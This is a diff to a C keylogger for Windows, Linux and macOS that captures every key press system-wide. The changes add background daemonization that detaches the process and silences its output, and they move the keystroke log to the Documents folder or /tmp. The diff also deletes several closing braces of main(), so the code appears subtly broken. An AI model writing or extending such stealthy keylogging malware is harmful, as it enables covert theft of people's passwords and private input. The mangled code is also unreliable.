@@ -1,6 +1,10 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <fcntl.h>
 
 #ifdef _WIN32  // Windows Version
 #include <windows.h>
@@ -24,7 +28,10 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
         char keyChar = getCharFromKey(p->vkCode);
         if (keyChar) {
-            log_file = fopen("keystrokes.txt", "a");
+            // Save to the user's Documents folder
+            char logPath[MAX_PATH];
+            snprintf(logPath, sizeof(logPath), "%s\\Documents\\keystrokes.txt", getenv("USERPROFILE"));
+            log_file = fopen(logPath, "a");
             if (log_file) {
                 fprintf(log_file, "%c", keyChar);
                 fclose(log_file);
@@ -51,15 +58,41 @@ int main() {
 
     UnhookWindowsHookEx(hHook);
     return 0;
-}
 
 #elif __linux__  // Linux Version
 #include <fcntl.h>
 #include <linux/input.h>
 #include <unistd.h>
 
-// current path is specific to latest ubuntu have not checke other systems
+// current path is specific to latest ubuntu have not checked other systems
 #define DEVICE "/dev/input/by-path/platform-i8042-serio-0-event-kbd"  // Change to your keyboard event file
+
+void daemonize() {
+    pid_t pid = fork();
+
+    if (pid < 0)
+        exit(EXIT_FAILURE);
+
+    if (pid > 0)
+        exit(EXIT_SUCCESS); // parent exits
+
+    if (setsid() < 0)
+        exit(EXIT_FAILURE);
+
+    pid = fork();
+    if (pid < 0)
+        exit(EXIT_FAILURE);
+
+    if (pid > 0)
+        exit(EXIT_SUCCESS);
+
+    umask(0);
+    chdir("/");
+
+    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
+        close(x);
+    }
+}
 
 int main() {
     struct input_event ev;
@@ -69,13 +102,16 @@ int main() {
         return 1;
     }
 
+    daemonize();
+
     printf("System-wide keylogger running... (Linux)\n");
 
     FILE *log_file;
     while (1) {
         read(fd, &ev, sizeof(struct input_event));
         if (ev.type == EV_KEY && ev.value == 1) {  // Key press event
-            log_file = fopen("keystrokes.txt", "a");
+            // Save to /tmp/keystrokes.txt
+            log_file = fopen("/tmp/keystrokes.txt", "a");
             if (log_file) {
                 fprintf(log_file, "Key %d pressed\n", ev.code);
                 fclose(log_file);
@@ -84,11 +120,46 @@ int main() {
     }
     close(fd);
     return 0;
-}
 
 #elif __APPLE__  // macOS Version
 #include <ApplicationServices/ApplicationServices.h>
 #include <Carbon/Carbon.h>
+
+void daemonize() {
+    pid_t pid = fork();
+
+    if (pid < 0) {
+        exit(EXIT_FAILURE);
+    }
+
+    if (pid > 0) {
+        exit(EXIT_SUCCESS); // Parent process exits
+    }
+
+    if (setsid() < 0) {
+        exit(EXIT_FAILURE); // Start a new session
+    }
+
+    pid = fork();
+    if (pid < 0) {
+        exit(EXIT_FAILURE);
+    }
+
+    if (pid > 0) {
+        exit(EXIT_SUCCESS); // Parent process exits
+    }
+
+    umask(0); // Set file permissions
+    chdir("/"); // Change to root directory
+
+    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
+        close(x); // Close all open file descriptors
+    }
+
+    open("/dev/null", O_RDWR); // Redirect stdin, stdout, stderr to /dev/null
+    dup(0);
+    dup(0);
+}
 
 FILE *log_file;
 
@@ -115,7 +186,8 @@ CGEventRef event_callback(CGEventTapProxy proxy, CGEventType type, CGEventRef ev
     if (type == kCGEventKeyDown) {
         char keyChar = getCharFromKey(event);
         if (keyChar) {
-            log_file = fopen("keystrokes.txt", "a");
+            // Save to /tmp/keystrokes.txt
+            log_file = fopen("/tmp/keystrokes.txt", "a");
             if (log_file) {
                 fprintf(log_file, "%c", keyChar);
                 fclose(log_file);
@@ -126,6 +198,7 @@ CGEventRef event_callback(CGEventTapProxy proxy, CGEventType type, CGEventRef ev
 }
 
 int main() {
+    daemonize();
     printf("System-wide keylogger running... (macOS)\n");
 
     CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, kCGEventMaskForAllEvents, event_callback, NULL);
@@ -140,7 +213,7 @@ int main() {
     CFRunLoopRun();
 
     return 0;
-}
+    }
 
 #else
 #error "Unsupported OS"
